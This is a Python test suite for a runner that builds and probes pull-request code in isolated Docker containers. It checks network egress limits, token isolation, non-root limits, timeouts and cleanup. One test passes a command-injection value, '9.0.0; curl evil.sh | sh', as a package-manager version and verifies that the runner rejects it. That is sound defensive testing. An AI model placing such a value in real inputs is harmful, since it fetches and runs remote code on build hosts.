import asyncio
import json
from pathlib import Path

from app.sandbox_probe.docker import ContainerSpec, ExecResult
from app.sandbox_probe.repo_inspect import Toolchain
from app.sandbox_probe.runner import (
    SandboxJobRunner,
    build_script,
    install_command,
    start_command,
)
from app.sandbox_probe.schema import SandboxProbeRequestedEvent
from tests.sandbox_fakes import FakeDocker, no_sleep

_TOKEN = "ghs_topsecret"

_PACKAGE_JSON = json.dumps(
    {
        "name": "app",
        "engines": {"node": ">=22"},
        "scripts": {"build": "nest build", "start:prod": "node dist/main"},
    }
)
_COMPOSE = """
services:
  db:
    image: postgres:17-alpine
    environment:
      POSTGRES_USER: app
      POSTGRES_PASSWORD: app
      POSTGRES_DB: appdb
"""
_ENV_EXAMPLE = """
PORT=3000
DATABASE_URL=postgres://app:app@localhost:5432/appdb
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/x
"""
_CLEAN_INIT_OUTPUT = json.dumps({"checked": 5, "failures": []})


class FakeTokenSource:
    def __init__(self) -> None:
        self.requests: list[tuple[int, int]] = []

    async def fetch_token(self, installation_id: int, repository_id: int) -> str:
        self.requests.append((installation_id, repository_id))
        return _TOKEN


def _event() -> SandboxProbeRequestedEvent:
    return SandboxProbeRequestedEvent(
        review_job_id="42:7:abc123",
        repository_id=42,
        installation_id=99,
        repo_full_name="org/repo",
        pr_number=7,
        head_sha="abc123",
        base_sha="def456",
    )


def _checkout_writing(files: dict[str, str]):  # type: ignore[no-untyped-def]
    async def fake_checkout(repo: str, sha: str, token: str, dest: Path, **kwargs: object) -> None:
        dest.mkdir(parents=True, exist_ok=True)
        for name, content in files.items():
            (dest / name).write_text(content)

    return fake_checkout


_DEFAULT_FILES = {
    "package.json": _PACKAGE_JSON,
    "pnpm-lock.yaml": "lockfileVersion: '9.0'",
    ".env.example": _ENV_EXAMPLE,
    "docker-compose.yml": _COMPOSE,
}


def _runner(
    tmp_path: Path,
    docker: FakeDocker,
    *,
    files: dict[str, str] | None = None,
    tokens: FakeTokenSource | None = None,
    **kwargs: object,
) -> SandboxJobRunner:
    return SandboxJobRunner(
        docker,
        tokens or FakeTokenSource(),
        workdir=tmp_path / "work",
        min_free_disk_gb=0,
        container_user="1000:1000",
        checkout_fn=_checkout_writing(files if files is not None else _DEFAULT_FILES),
        sleep=no_sleep,
        **kwargs,  # type: ignore[arg-type]
    )


def _ok_handler(spec: ContainerSpec) -> ExecResult:
    if spec.name.endswith("-init"):
        return ExecResult(0, _CLEAN_INIT_OUTPUT)
    return ExecResult(0, "")


async def test_clean_pr_passes_after_running_every_stage(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler
    tokens = FakeTokenSource()

    result = await _runner(tmp_path, docker, tokens=tokens).run(_event())

    assert result.status == "passed"
    assert result.review_job_id == "42:7:abc123"
    assert result.findings == []
    assert tokens.requests == [(99, 42)]
    assert [s.name.rsplit("-", 1)[1] for s in docker.ran] == ["install", "build", "init"]
    assert len(docker.cleaned) == 1


async def test_only_the_install_stage_can_reach_the_egress_proxy(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler

    await _runner(tmp_path, docker).run(_event())

    by_name = {s.name.rsplit("-", 1)[1]: s for s in docker.ran}
    assert "HTTPS_PROXY" in by_name["install"].env
    assert "HTTPS_PROXY" not in by_name["build"].env
    assert "HTTPS_PROXY" not in by_name["init"].env
    internal = {name for name, is_internal in docker.networks if is_internal}
    assert by_name["install"].network in internal
    assert by_name["build"].network in internal
    proxy = next(s for s in docker.started if s.name.endswith("-proxy"))
    assert proxy.network not in internal
    assert proxy.extra_networks and proxy.extra_networks[0] in internal
    assert any(name.endswith("-proxy") for name in docker.removed)


async def test_probe_env_has_no_real_secrets_and_points_at_the_sidecars(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler

    await _runner(tmp_path, docker).run(_event())

    init = next(s for s in docker.ran if s.name.endswith("-init"))
    assert init.env["DATABASE_URL"] == "postgres://app:app@db:5432/appdb"
    assert init.env["DISCORD_WEBHOOK_URL"] == "http://mock:9000"
    assert init.env["NODE_ENV"] == "test"
    sidecar = next(s for s in docker.started if s.name.endswith("-db"))
    assert sidecar.env["POSTGRES_DB"] == "appdb"
    assert sidecar.aliases == ("db",)


async def test_installation_token_never_reaches_any_container(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler

    await _runner(tmp_path, docker).run(_event())

    for spec in [*docker.ran, *docker.started]:
        assert _TOKEN not in repr(spec)


async def test_containers_are_capped_and_non_root(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler

    await _runner(tmp_path, docker).run(_event())

    for spec in docker.ran:
        assert spec.user == "1000:1000"
        assert spec.read_only_root
        assert spec.memory and spec.cpus


async def test_install_failure_is_inconclusive_and_stops_before_build(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = lambda spec: ExecResult(1, "ERR_PNPM_FROZEN_LOCKFILE")

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "inconclusive"
    assert "ERR_PNPM_FROZEN_LOCKFILE" in result.evidence
    assert [s.name.rsplit("-", 1)[1] for s in docker.ran] == ["install"]


async def test_install_timeout_is_inconclusive(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = lambda spec: ExecResult(-1, "", timed_out=True)

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "inconclusive"
    assert "제한 시간" in result.evidence


async def test_build_failure_is_reported_as_an_issue_and_skips_probes(tmp_path: Path) -> None:
    docker = FakeDocker()

    def handler(spec: ContainerSpec) -> ExecResult:
        if spec.name.endswith("-build"):
            return ExecResult(2, "src/a.ts(1,1): error TS2322")
        return ExecResult(0, "")

    docker.run_handler = handler

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "found_issue"
    assert result.findings[0].probe == "build"
    assert "TS2322" in result.findings[0].evidence
    assert docker.started and not any(s.name.endswith("-app") for s in docker.started)


async def test_build_timeout_is_inconclusive_not_an_issue(tmp_path: Path) -> None:
    docker = FakeDocker()

    def handler(spec: ContainerSpec) -> ExecResult:
        if spec.name.endswith("-build"):
            return ExecResult(-1, "", timed_out=True)
        return ExecResult(0, "")

    docker.run_handler = handler

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "inconclusive"


async def test_init_order_finding_makes_the_job_found_issue(tmp_path: Path) -> None:
    docker = FakeDocker()
    failure = {"file": "a/b.js", "error": "ReferenceError: Cannot access 'B' before initialization"}

    def handler(spec: ContainerSpec) -> ExecResult:
        if spec.name.endswith("-init"):
            return ExecResult(0, json.dumps({"checked": 3, "failures": [failure]}))
        return ExecResult(0, "")

    docker.run_handler = handler

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "found_issue"
    assert result.findings[0].file_path == "src/a/b.ts"


async def test_lifecycle_finding_makes_the_job_found_issue(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler
    docker.send_shutdown_notification = False

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "found_issue"
    assert result.findings[0].probe == "lifecycle"


async def test_repo_without_determinable_toolchain_is_inconclusive_without_containers(
    tmp_path: Path,
) -> None:
    docker = FakeDocker()
    files = {"package.json": json.dumps({"scripts": {"build": "tsc"}})}

    result = await _runner(tmp_path, docker, files=files, default_node_major=None).run(_event())

    assert result.status == "inconclusive"
    assert docker.ran == [] and docker.started == []


async def test_default_node_major_is_used_when_the_repo_does_not_say(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler
    files = {
        "package.json": json.dumps({"scripts": {"build": "tsc"}}),
        "package-lock.json": "{}",
    }

    await _runner(tmp_path, docker, files=files, default_node_major="24").run(_event())

    assert docker.ran[0].image == "node:24-slim"


async def test_repo_without_build_script_is_inconclusive(tmp_path: Path) -> None:
    docker = FakeDocker()
    files = {**_DEFAULT_FILES, "package.json": json.dumps({"engines": {"node": "22"}})}

    result = await _runner(tmp_path, docker, files=files).run(_event())

    assert result.status == "inconclusive"
    assert "build" in result.evidence


async def test_job_timeout_is_inconclusive_and_still_cleans_up(tmp_path: Path) -> None:
    docker = FakeDocker()

    async def slow_run(spec: ContainerSpec, job_id: str, *, timeout: float) -> ExecResult:
        await asyncio.sleep(5)
        return ExecResult(0, "")

    docker.run = slow_run  # type: ignore[method-assign]

    result = await _runner(tmp_path, docker, job_timeout_seconds=0.05).run(_event())

    assert result.status == "inconclusive"
    assert "제한 시간" in result.evidence
    assert len(docker.cleaned) == 1


async def test_unexpected_error_is_inconclusive_and_still_cleans_up(tmp_path: Path) -> None:
    docker = FakeDocker()

    async def boom(name: str, job_id: str, *, internal: bool) -> None:
        raise RuntimeError("docker daemon down")

    docker.create_network = boom  # type: ignore[method-assign]

    result = await _runner(tmp_path, docker).run(_event())

    assert result.status == "inconclusive"
    assert "RuntimeError" in result.evidence
    assert "docker daemon down" not in result.evidence
    assert len(docker.cleaned) == 1


async def test_low_disk_space_is_inconclusive_before_any_work(tmp_path: Path) -> None:
    docker = FakeDocker()
    tokens = FakeTokenSource()
    runner = SandboxJobRunner(
        docker,
        tokens,
        workdir=tmp_path / "work",
        min_free_disk_gb=10**9,
        checkout_fn=_checkout_writing(_DEFAULT_FILES),
        sleep=no_sleep,
    )

    result = await runner.run(_event())

    assert result.status == "inconclusive"
    assert tokens.requests == []


async def test_job_workdir_is_removed_afterwards(tmp_path: Path) -> None:
    docker = FakeDocker()
    docker.run_handler = _ok_handler

    await _runner(tmp_path, docker).run(_event())

    assert list((tmp_path / "work").iterdir()) == []


def test_install_command_uses_lockfile_manager() -> None:
    assert install_command(Toolchain("npm", "22")) == ["sh", "-c", "npm ci"]
    pnpm = install_command(Toolchain("pnpm", "22", "9.1.0"))[2]
    assert "pnpm@9.1.0" in pnpm
    assert "pnpm install --frozen-lockfile" in pnpm


def test_install_command_falls_back_to_latest_for_unsafe_versions() -> None:
    script = install_command(Toolchain("pnpm", "22", "9.0.0; curl evil.sh | sh"))[2]

    assert "evil" not in script
    assert "pnpm@latest" in script


def test_start_command_follows_start_prod_script_when_it_is_plain_node() -> None:
    assert start_command(json.dumps({"scripts": {"start:prod": "node dist/src/main.js"}})) == [
        "node", "dist/src/main.js",
    ]  # fmt: skip
    assert start_command(json.dumps({"scripts": {"start:prod": "pm2 start"}})) == [
        "node", "dist/main",
    ]  # fmt: skip
    assert start_command("not json") == ["node", "dist/main"]


def test_build_script_reads_the_build_script() -> None:
    assert build_script(json.dumps({"scripts": {"build": "nest build"}})) == "nest build"
    assert build_script(json.dumps({"scripts": {}})) is None
    assert build_script("not json") is None
